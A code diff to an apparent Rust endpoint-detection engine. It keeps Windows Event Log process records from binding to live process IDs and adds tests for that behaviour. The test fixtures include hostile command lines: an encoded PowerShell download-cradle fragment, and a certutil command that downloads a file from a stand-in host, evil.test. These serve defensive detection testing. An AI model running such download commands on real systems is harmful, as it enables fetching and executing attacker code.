@@ -64,6 +64,26 @@ use ioa::ProcContext;
 
 pub use ioc::IocSet;
 
+/// Native Windows process audit records have no verified live generation.
+/// Findings keep this source marker so admission and response stay fail-closed.
+pub(crate) fn is_historical_windows_process_event(event: &AgentEvent) -> bool {
+    matches!(
+        event.origin.as_ref().and_then(|o| o.source.as_deref()),
+        Some("windows_eventlog:Security:4688")
+            | Some("windows_eventlog:Microsoft-Windows-Sysmon/Operational:1")
+    )
+}
+
+/// Windows Event Log records are persisted audit evidence, including their
+/// derived findings; their PIDs are not verified live process identities.
+pub(crate) fn is_historical_windows_record(event: &AgentEvent) -> bool {
+    event
+        .origin
+        .as_ref()
+        .and_then(|o| o.source.as_deref())
+        .is_some_and(|source| source.starts_with("windows_eventlog:"))
+}
+
 /// A mass write alone is a build, a `git checkout` or a sync client; it is
 /// ransomware-like only together with encrypted-looking content, a ransom
 /// extension or tampered backups seen this close in time (either order).
@@ -317,16 +337,24 @@ impl DetectionEngine {
         // Stateful IOA correlation runs first: it keeps the process tree
         // current (so this event's own process resolves), yields the acting
         // process's context, and emits any attack chains that just completed.
-        let (ioa, ctx, own) = match self.ioa.lock() {
-            Ok(mut e) => {
-                let res = e.observe(event, now);
-                let own = res
-                    .pid
-                    .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
-                let ctx = res.pid.and_then(|p| e.context(p));
-                (res, ctx, own)
+        let historical_process = is_historical_windows_process_event(event)
+            && matches!(event.data, EventData::ProcessCreate(_));
+        let (ioa, ctx, own) = if historical_process {
+            // Audit timestamps and PIDs describe an earlier process, not the
+            // currently running generation. Never update or query live IOA.
+            (ioa::IoaResult::default(), None, false)
+        } else {
+            match self.ioa.lock() {
+                Ok(mut e) => {
+                    let res = e.observe(event, now);
+                    let own = res
+                        .pid
+                        .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
+                    let ctx = res.pid.and_then(|p| e.context(p));
+                    (res, ctx, own)
+                }
+                Err(_) => (ioa::IoaResult::default(), None, false),
             }
-            Err(_) => (ioa::IoaResult::default(), None, false),
         };
         if own {
             return Vec::new();
@@ -339,7 +367,16 @@ impl DetectionEngine {
                 // With eBPF exec telemetry every process also arrives as a
                 // ProcessExec; inspecting the /proc-polled copy too would
                 // duplicate every process finding.
-                if !self.ebpf_exec_seen.load(Relaxed) {
+                if historical_process {
+                    self.inspect_process_rules(
+                        &p.name,
+                        &p.exe,
+                        &p.cmdline,
+                        p.exe_sha256.as_deref(),
+                        None,
+                        &mut out,
+                    );
+                } else if !self.ebpf_exec_seen.load(Relaxed) {
                     self.inspect_process(
                         &p.name,
                         &p.exe,
@@ -508,7 +545,11 @@ impl DetectionEngine {
 
         // Enrich the per-event findings with the actor's process lineage, then
         // add the attack chains that just completed.
-        if let Some(lineage) = &ioa.lineage {
+        if let Some(lineage) = ioa
+            .lineage
+            .as_ref()
+            .filter(|_| !is_historical_windows_record(event))
+        {
             for ev in out.iter_mut() {
                 if let EventData::Detection(d) = &mut ev.data {
                     inject_lineage(&mut d.evidence, lineage);
@@ -520,11 +561,24 @@ impl DetectionEngine {
         }
 
         for ev in out.iter_mut() {
+            if is_historical_windows_record(event) {
+                // Preserve the audit provenance on findings: external
+                // admission and response must not rebind an archived PID.
+                ev.timestamp = match &event.data {
+                    EventData::Log(log) => log.log_timestamp.unwrap_or(event.timestamp),
+                    _ => event.timestamp,
+                };
+                if let (Some(finding_origin), Some(trigger_origin)) =
+                    (&mut ev.origin, &event.origin)
+                {
+                    finding_origin.source = trigger_origin.source.clone();
+                }
+            }
             self.finalize(ev, Some(event), ctx);
         }
         // Inspect deterministic evidence first. A suspicious execution cannot
         // authorize its own admission to the learned normal baseline.
-        if self.anomaly_enabled.load(Relaxed) {
+        if !historical_process && self.anomaly_enabled.load(Relaxed) {
             let actor = match &event.data {
                 EventData::ProcessExec(p) => Some((&p.username, &p.exe)),
                 EventData::ProcessCreate(p) if !self.ebpf_exec_seen.load(Relaxed) => {
@@ -610,13 +664,17 @@ impl DetectionEngine {
                 .and_then(|v| v.as_i64())
                 .map(|p| p as i32)
                 .or_else(|| d.correlation.as_ref().and_then(|c| c.pid));
-            let (ctx, own, lineage) = match (pid, self.ioa.lock()) {
-                (Some(pid), Ok(e)) => (
-                    e.context(pid),
-                    pid == self.self_pid || e.descends_from(self.self_pid, pid),
-                    e.lineage(pid),
-                ),
-                _ => (None, false, None),
+            let (ctx, own, lineage) = if is_historical_windows_record(&event) {
+                (None, false, None)
+            } else {
+                match (pid, self.ioa.lock()) {
+                    (Some(pid), Ok(e)) => (
+                        e.context(pid),
+                        pid == self.self_pid || e.descends_from(self.self_pid, pid),
+                        e.lineage(pid),
+                    ),
+                    _ => (None, false, None),
+                }
             };
             if own {
                 return Vec::new();
@@ -652,6 +710,13 @@ impl DetectionEngine {
         trigger: Option<&AgentEvent>,
         ctx: Option<&ProcContext>,
     ) {
+        let ctx = if is_historical_windows_record(ev)
+            || trigger.is_some_and(is_historical_windows_record)
+        {
+            None
+        } else {
+            ctx
+        };
         let emitted_severity = ev.severity;
         let EventData::Detection(d) = &mut ev.data else {
             return;
@@ -747,6 +812,40 @@ impl DetectionEngine {
         ctx: Option<&ProcContext>,
         out: &mut Vec<AgentEvent>,
     ) {
+        self.inspect_process_rules(comm, exe, cmdline, exe_hash, ctx, out);
+
+        // Session-level stateful rules.
+        let base = comm.rsplit('/').next().unwrap_or(comm);
+        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
+        let now = self.clock();
+        if let Ok(mut st) = self.stateful.lock() {
+            if let Some(session) = &session {
+                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+                if base == "systemctl" {
+                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
+                        out.push(self.detection(Severity::Info, d));
+                    }
+                }
+            }
+            if is_temp_path(exe) {
+                if let Some(d) = st.observe_temp_exec(exe, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
+        }
+    }
+
+    fn inspect_process_rules(
+        &self,
+        comm: &str,
+        exe: &str,
+        cmdline: &str,
+        exe_hash: Option<&str>,
+        ctx: Option<&ProcContext>,
+        out: &mut Vec<AgentEvent>,
+    ) {
         // IOC: known-bad executable hash.
         if let Some(h) = exe_hash {
             let hit = self.iocs.read().map(|i| i.match_hash(h)).unwrap_or(false);
@@ -792,28 +891,6 @@ impl DetectionEngine {
             windows_evasion_rules::inspect_additional(comm, exe, cmdline, ctx, &windows_found);
         for d in windows_found.into_iter().chain(windows_extra) {
             out.push(self.detection(Severity::Info, d));
-        }
-
-        // Session-level stateful rules.
-        let base = comm.rsplit('/').next().unwrap_or(comm);
-        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
-        let now = self.clock();
-        if let Ok(mut st) = self.stateful.lock() {
-            if let Some(session) = &session {
-                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
-                    out.push(self.detection(Severity::Info, d));
-                }
-                if base == "systemctl" {
-                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
-                        out.push(self.detection(Severity::Info, d));
-                    }
-                }
-            }
-            if is_temp_path(exe) {
-                if let Some(d) = st.observe_temp_exec(exe, now) {
-                    out.push(self.detection(Severity::Info, d));
-                }
-            }
         }
     }
 
@@ -1609,9 +1686,15 @@ fn is_user_writable_path(path: &str) -> bool {
     ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
         .iter()
         .any(|d| p.starts_with(d))
-        || ["/appdata/local/temp/", "/appdata/roaming/", "/downloads/", "/users/public/", "/windows/temp/"]
-            .iter()
-            .any(|d| p.contains(d))
+        || [
+            "/appdata/local/temp/",
+            "/appdata/roaming/",
+            "/downloads/",
+            "/users/public/",
+            "/windows/temp/",
+        ]
+        .iter()
+        .any(|d| p.contains(d))
 }
 
 /// True if `addr` is a routable destination worth cadence-tracking (skips
@@ -1920,13 +2003,32 @@ mod tests {
     #[test]
     fn public_destination_excludes_lan_and_local_ranges() {
         for lan in [
-            "10.0.0.36", "10.0.0.1", "192.168.1.5", "172.16.0.9", "127.0.0.1", "169.254.169.254",
-            "100.64.0.1", "224.0.0.251", "0.0.0.0", "::1", "fe80::1", "fe80::1%12", "fd12:3456::1",
-            "ff02::fb", "::ffff:10.0.0.1", "", "not-an-ip",
+            "10.0.0.36",
+            "10.0.0.1",
+            "192.168.1.5",
+            "172.16.0.9",
+            "127.0.0.1",
+            "169.254.169.254",
+            "100.64.0.1",
+            "224.0.0.251",
+            "0.0.0.0",
+            "::1",
+            "fe80::1",
+            "fe80::1%12",
+            "fd12:3456::1",
+            "ff02::fb",
+            "::ffff:10.0.0.1",
+            "",
+            "not-an-ip",
         ] {
             assert!(!is_public_destination(lan), "{lan} must not be public");
         }
-        for public in ["40.90.8.111", "185.22.141.18", "2001:4860:4840:400::443", "::ffff:8.8.8.8"] {
+        for public in [
+            "40.90.8.111",
+            "185.22.141.18",
+            "2001:4860:4840:400::443",
+            "::ffff:8.8.8.8",
+        ] {
             assert!(is_public_destination(public), "{public} must be public");
         }
     }
@@ -1934,13 +2036,22 @@ mod tests {
     #[test]
     fn user_writable_path_covers_linux_and_windows() {
         for p in [
-            "/tmp/x", "/dev/shm/a", "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe",
-            "c:\\users\\bob\\appdata\\roaming\\x\\y.exe", "C:\\Users\\bob\\Downloads\\a.exe",
-            "C:\\Users\\Public\\a.exe", "C:\\Windows\\Temp\\a.exe",
+            "/tmp/x",
+            "/dev/shm/a",
+            "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe",
+            "c:\\users\\bob\\appdata\\roaming\\x\\y.exe",
+            "C:\\Users\\bob\\Downloads\\a.exe",
+            "C:\\Users\\Public\\a.exe",
+            "C:\\Windows\\Temp\\a.exe",
         ] {
             assert!(is_user_writable_path(p), "{p}");
         }
-        for p in ["", "/usr/bin/curl", "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "C:\\Windows\\System32\\svchost.exe"] {
+        for p in [
+            "",
+            "/usr/bin/curl",
+            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+        ] {
             assert!(!is_user_writable_path(p), "{p}");
         }
     }
@@ -1975,7 +2086,11 @@ mod tests {
     fn lan_beacons_are_not_reported() {
         // Chromecast (10.0.0.36:8009) and the router (10.0.0.1:49000) from a
         // real host produced "high" C2 alerts before.
-        assert!(beacon_through_engine("10.0.0.36", "C:\\Program Files\\Google\\Chrome\\chrome.exe").is_none());
+        assert!(beacon_through_engine(
+            "10.0.0.36",
+            "C:\\Program Files\\Google\\Chrome\\chrome.exe"
+        )
+        .is_none());
         assert!(beacon_through_engine("10.0.0.1", "").is_none());
     }
 
@@ -1983,16 +2098,23 @@ mod tests {
     fn routine_public_beacon_is_a_low_signal() {
         let f = beacon_through_engine("40.90.8.111", "C:\\Windows\\System32\\svchost.exe")
             .expect("regular public cadence is still observed");
-        let EventData::Detection(d) = &f.data else { unreachable!() };
+        let EventData::Detection(d) = &f.data else {
+            unreachable!()
+        };
         assert_eq!(d.mode, Some(DetectionMode::Signal));
         assert!(f.severity <= Severity::Low, "{:?}", f.severity);
     }
 
     #[test]
     fn beacon_from_user_writable_exe_alerts() {
-        let f = beacon_through_engine("185.22.141.18", "C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe")
-            .expect("beacon expected");
-        let EventData::Detection(d) = &f.data else { unreachable!() };
+        let f = beacon_through_engine(
+            "185.22.141.18",
+            "C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe",
+        )
+        .expect("beacon expected");
+        let EventData::Detection(d) = &f.data else {
+            unreachable!()
+        };
         assert_eq!(d.mode, Some(DetectionMode::Alert));
         assert!(f.severity >= Severity::Medium, "{:?}", f.severity);
     }
@@ -2022,7 +2144,9 @@ mod tests {
     }
 
     fn mode_of(f: &AgentEvent) -> DetectionMode {
-        let EventData::Detection(d) = &f.data else { unreachable!() };
+        let EventData::Detection(d) = &f.data else {
+            unreachable!()
+        };
         d.mode.expect("finalised finding has a mode")
     }
 
@@ -2043,16 +2167,27 @@ mod tests {
         let mut alerts = 0;
         for i in 0..4 {
             let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), i as f64);
-            alerts += e.admit(f).iter().filter(|x| mode_of(&x.event) == DetectionMode::Alert).count();
+            alerts += e
+                .admit(f)
+                .iter()
+                .filter(|x| mode_of(&x.event) == DetectionMode::Alert)
+                .count();
         }
         assert_eq!(alerts, 0, "no corroboration yet");
         let f = ransomware_findings_at(
             &e,
-            &indicator("suspicious_extension", Some("C:\\Users\\bob\\Documents\\a.txt.locked")),
+            &indicator(
+                "suspicious_extension",
+                Some("C:\\Users\\bob\\Documents\\a.txt.locked"),
+            ),
             5.0,
         );
         assert!(f.iter().any(|x| matches!(&x.data, EventData::Detection(d) if d.rule_id == "ransomware.mass_modification")), "burst re-raised");
-        alerts += e.admit(f).iter().filter(|x| mode_of(&x.event) == DetectionMode::Alert).count();
+        alerts += e
+            .admit(f)
+            .iter()
+            .filter(|x| mode_of(&x.event) == DetectionMode::Alert)
+            .count();
         assert!(alerts >= 1);
     }
 
@@ -2087,7 +2222,9 @@ mod tests {
         for i in 0..20 {
             let path = format!("C:\\Users\\bob\\Documents\\f{i}.docx.locked");
             let found = ransomware_findings(&e, &indicator("suspicious_extension", Some(&path)));
-            let EventData::Detection(d) = &found[0].data else { unreachable!() };
+            let EventData::Detection(d) = &found[0].data else {
+                unreachable!()
+            };
             assert_eq!(d.rule_id, "ransomware.suspicious_extension");
             emitted += e.admit(found).len();
         }
@@ -2098,12 +2235,19 @@ mod tests {
     fn backup_deletion_alerts_and_entropy_alone_never_does() {
         let e = engine();
         let f = ransomware_findings(&e, &indicator("backup_deletion", Some("C:\\Backup\\a.bak")));
-        let EventData::Detection(d) = &f[0].data else { unreachable!() };
+        let EventData::Detection(d) = &f[0].data else {
+            unreachable!()
+        };
         assert_eq!(d.rule_id, "ransomware.backup_tamper");
         assert_eq!(d.mode, Some(DetectionMode::Alert));
 
-        let f = ransomware_findings(&e, &indicator("high_entropy", Some("C:\\Users\\bob\\a.txt")));
-        let EventData::Detection(d) = &f[0].data else { unreachable!() };
+        let f = ransomware_findings(
+            &e,
+            &indicator("high_entropy", Some("C:\\Users\\bob\\a.txt")),
+        );
+        let EventData::Detection(d) = &f[0].data else {
+            unreachable!()
+        };
         assert_eq!(d.rule_id, "ransomware.high_entropy");
         assert_eq!(d.mode, Some(DetectionMode::Signal));
         assert!(f[0].severity <= Severity::Low);
@@ -2172,7 +2316,9 @@ mod tests {
         let e = engine();
         assert!(e.inspect(&process_audit_event("")).is_empty());
         assert!(e
-            .inspect(&process_audit_event("certutil -hashfile C:\\Install\\setup.msi SHA256"))
+            .inspect(&process_audit_event(
+                "certutil -hashfile C:\\Install\\setup.msi SHA256"
+            ))
             .is_empty());
     }
 
@@ -2221,6 +2367,122 @@ mod tests {
         match &ev.data {
             EventData::Detection(d) => d,
             _ => panic!("not a detection"),
+        }
+    }
+
+    #[test]
+    fn historical_windows_process_never_borrows_reused_pid_context() {
+        for source in [
+            "windows_eventlog:Security:4688",
+            "windows_eventlog:Microsoft-Windows-Sysmon/Operational:1",
+        ] {
+            let e = engine();
+            let now = Instant::now();
+            {
+                let mut ioa = e.ioa.lock().unwrap();
+                ioa.observe(&exec(200, 1, 0, "sshd", "/usr/sbin/sshd", "sshd"), now);
+                ioa.observe(&exec(300, 200, 1000, "safe", "/usr/bin/safe", "safe"), now);
+            }
+            let before = e.ioa.lock().unwrap().context(300).unwrap();
+            let mut historical = AgentEvent::new(
+                "a".into(), "h".into(), EventClass::Process, EventAction::Create, Severity::Info,
+                EventData::ProcessCreate(ProcessCreateData {
+                    pid: 300, ppid: 777, name: "powershell.exe".into(),
+                    exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into(),
+                    cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA".into(),
+                    username: "DOMAIN\\former".into(), exe_sha256: Some("deadbeef".into()),
+                    ..Default::default()
+                }),
+            ).with_source(source);
+            historical.timestamp = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
+                .unwrap()
+                .with_timezone(&chrono::Utc);
+            let findings = e.inspect_at(&historical, now, 10.0);
+            let finding = find(&findings, "execution.powershell_encoded")
+                .expect("audit command line remains detectable");
+            assert_eq!(finding.timestamp, historical.timestamp);
+            let correlation = det_of(finding).correlation.as_ref().unwrap();
+            assert!(
+                correlation.process_key.is_none(),
+                "audit PID must not bind to live generation"
+            );
+            assert!(correlation.parent_key.is_none());
+            assert!(correlation.root_key.is_none());
+            assert!(correlation.lineage_keys.is_empty());
+            assert_eq!(correlation.pid, Some(300));
+            assert_eq!(correlation.user.as_deref(), Some("DOMAIN\\former"));
+            assert_eq!(
+                correlation.exe.as_deref(),
+                Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
+            );
+            assert!(det_of(finding).evidence.get("process_lineage").is_none());
+            assert_eq!(
+                finding.origin.as_ref().unwrap().source.as_deref(),
+                Some(source)
+            );
+            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
+            // Main-loop external admission must not reacquire the live PID.
+            let ioc = find(&findings, "ioc.process_hash").unwrap().clone();
+            let admitted = e.admit_external_at(ioc, now);
+            assert!(!admitted.is_empty());
+            for emitted in admitted {
+                let d = det_of(&emitted.event);
+                assert!(d.correlation.as_ref().unwrap().process_key.is_none());
+                assert!(d.correlation.as_ref().unwrap().lineage_keys.is_empty());
+                assert!(d.evidence.get("process_lineage").is_none());
+            }
+            e.ebpf_exec_seen.store(true, Relaxed);
+            assert!(
+                find(
+                    &e.inspect_at(&historical, now, 11.0),
+                    "execution.powershell_encoded"
+                )
+                .is_some(),
+                "live telemetry latch must not suppress historical audit detection"
+            );
+            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
+        }
+    }
+
+    #[test]
+    fn historical_windows_raw_log_findings_preserve_provenance_on_admission() {
+        let e = engine();
+        e.set_rule_modes(&[crate::config::RuleModeOverride {
+            rule: "lolbin.certutil_download".into(),
+            mode: DetectionMode::Alert,
+        }]);
+        let now = Instant::now();
+        e.ioa
+            .lock()
+            .unwrap()
+            .observe(&exec(300, 1, 1000, "safe", "/usr/bin/safe", "safe"), now);
+        let mut audit =
+            process_audit_event("certutil -urlcache -f http://evil.test/a.txt C:\\Temp\\a.txt")
+                .with_source("windows_eventlog:Security");
+        let observed = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
+            .unwrap()
+            .with_timezone(&chrono::Utc);
+        if let EventData::Log(log) = &mut audit.data {
+            log.pid = Some(300); // Provider process, not necessarily the actor.
+            log.log_timestamp = Some(observed);
+        }
+        let findings = e.inspect_at(&audit, now, 10.0);
+        let mut finding = find(&findings, "lolbin.certutil_download").unwrap().clone();
+        assert_eq!(
+            finding.origin.as_ref().unwrap().source.as_deref(),
+            Some("windows_eventlog:Security")
+        );
+        assert_eq!(finding.timestamp, observed);
+        // Even a forensic PID added by an external rule cannot bind live context.
+        if let EventData::Detection(d) = &mut finding.data {
+            d.evidence["pid"] = serde_json::json!(300);
+        }
+        let admitted = e.admit_external_at(finding, now);
+        assert!(!admitted.is_empty());
+        for finding in admitted {
+            let d = det_of(&finding.event);
+            assert!(d.correlation.as_ref().unwrap().process_key.is_none());
+            assert!(d.evidence.get("process_lineage").is_none());
         }
     }
 
